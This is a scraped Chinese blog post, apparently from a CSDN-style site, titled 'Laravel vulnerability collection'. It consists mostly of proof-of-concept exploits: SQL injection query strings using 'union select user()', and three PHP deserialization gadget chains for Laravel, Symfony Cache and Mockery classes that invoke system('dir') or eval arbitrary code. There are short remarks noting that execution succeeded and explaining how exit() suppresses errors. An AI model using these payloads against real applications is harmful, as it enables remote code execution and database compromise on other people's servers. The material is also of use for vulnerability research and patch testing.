{"blogid": "119799740", "writerAge": "码龄2年", "writerBlogNum": "225", "writerCollect": "318", "writerComment": "41", "writerFan": "216", "writerGrade": "5级", "writerIntegral": "2444", "writerName": "xzhome", "writerProfileAdress": "writer_image\\profile_119799740.jpg", "writerRankTotal": "8220", "writerRankWeekly": "58653", "writerThumb": "109", "writerVisitNum": "194096", "blog_read_count": "9718", "blog_time": "于 2021-08-19 13:22:20 发布", "blog_title": "Laravel 漏洞合集", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<h1> Laravel 漏洞合集</h1>\n<h2>Laravel 存在SQL注入漏洞</h2>\n<h3>poc:</h3>\n<p>/test?email=1&amp;id=1 union select user()#</p>\n<p>/test?email=1/`&amp;id=1&amp;column=/ union select user()--+-</p>\n<p>可以看的注入成功</p>\n<p></p>\n<h2>Laravel 反序列化漏洞</h2>\n<h3>一.   poc:</h3>\n<p>&lt;?php<br/> namespace Illuminate\\Broadcasting{<!-- --></p>\n<p>    use Illuminate\\Bus\\Dispatcher;<br/>     use Illuminate\\Foundation\\Console\\QueuedCommand;</p>\n<p>    class PendingBroadcast<br/>     {<!-- --><br/>         protected $events;<br/>         protected $event;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;events=new Dispatcher();<br/>             $this-&gt;event=new QueuedCommand();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\\Foundation\\Console{<!-- --><br/>     class QueuedCommand<br/>     {<!-- --><br/>         public $connection=\"dir\";<br/>     }<br/> }<br/> namespace Illuminate\\Bus{<!-- --><br/>     class Dispatcher<br/>     {<!-- --><br/>         protected $queueResolver=\"system\";</p>\n<p>    }<br/> }<br/> namespace{<!-- --></p>\n<p>    use Illuminate\\Broadcasting\\PendingBroadcast;</p>\n<p>    echo urlencode(serialize(new PendingBroadcast()));<br/> }</p>\n<p><img alt=\"\" height=\"654\" src=\"image\\20210819131857702.png\" width=\"1200\"/></p>\n<p> 发现得到回显</p>\n<p></p>\n<h3>二.    poc:</h3>\n<p>&lt;?php<br/> namespace Illuminate\\Broadcasting{<!-- --></p>\n<p>    use Illuminate\\Bus\\Dispatcher;<br/>     use Illuminate\\Foundation\\Console\\QueuedCommand;</p>\n<p>    class PendingBroadcast<br/>     {<!-- --><br/>         protected $events;<br/>         protected $event;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;events=new Dispatcher();<br/>             $this-&gt;event=new QueuedCommand();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\\Foundation\\Console{<!-- --></p>\n<p>    use Mockery\\Generator\\MockDefinition;</p>\n<p>    class QueuedCommand<br/>     {<!-- --><br/>         public $connection;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;connection=new MockDefinition();<br/>         }<br/>     }<br/> }<br/> namespace Illuminate\\Bus{<!-- --></p>\n<p>    use Mockery\\Loader\\EvalLoader;</p>\n<p>    class Dispatcher<br/>     {<!-- --><br/>         protected $queueResolver;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;queueResolver=[new EvalLoader(),'load'];<br/>         }<br/>     }<br/> }<br/> namespace Mockery\\Loader{<!-- --><br/>     class EvalLoader<br/>     {<!-- --></p>\n<p>    }<br/> }<br/> namespace Mockery\\Generator{<!-- --><br/>     class MockDefinition<br/>     {<!-- --><br/>         protected $config;<br/>         protected $code;<br/>         public function __construct()<br/>         {<!-- --><br/>             $this-&gt;code=\"&lt;?php phpinfo();exit()?&gt;\";<br/>             $this-&gt;config=new MockConfiguration();<br/>         }<br/>     }<br/>     class MockConfiguration<br/>     {<!-- --><br/>         protected $name=\"feng\";<br/>     }<br/> }</p>\n<p>namespace{<!-- --></p>\n<p>    use Illuminate\\Broadcasting\\PendingBroadcast;</p>\n<p>    echo urlencode(serialize(new PendingBroadcast()));<br/> }</p>\n<p>这个POC就更加舒服了，因为利用的是eval，可以任意执行代码，不仅仅局限于单参数的函数了。而且注意这个：$this-&gt;code=\"&lt;?php phpinfo();exit()?&gt;\";<br/> 加上了exit()，提前结束了进程，这样调用完call_user_func，后面的代码就不会执行，也就不会抛出异常了，更加好了。<br/>  </p>\n<h3>三.   poc:</h3>\n<p>&lt;?php<br/> namespace Symfony\\Component\\Cache\\Adapter{<!-- --></p>\n<p>    use Symfony\\Component\\Cache\\CacheItem;</p>\n<p>    class TagAwareAdapter<br/>     {<!-- --><br/>         private $deferred;<br/>         public function __construct(){<!-- --><br/>             $this-&gt;pool=new ProxyAdapter();<br/>             $this-&gt;deferred=array(<br/>                 'feng'=&gt;new CacheItem()<br/>             );<br/>         }<br/>     }<br/> }<br/> namespace Symfony\\Component\\Cache{<!-- --><br/>     final class CacheItem{<!-- --><br/>         protected $poolHash=\"1\";<br/>         protected $innerItem=\"dir\";<br/>     }<br/> }<br/> namespace Symfony\\Component\\Cache\\Adapter{<!-- --><br/>     class ProxyAdapter<br/>     {<!-- --><br/>         private $poolHash=\"1\";<br/>         private $setInnerItem=\"system\";<br/>     }<br/> }<br/> namespace{<!-- --></p>\n<p>    use Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter;</p>\n<p>    echo urlencode(serialize(new TagAwareAdapter()));<br/> }</p>\n<p><img alt=\"\" height=\"539\" src=\"image\\20210819132148115.png\" width=\"1170\"/></p>\n<p> 执行成功</p>\n</div>\n</div>"}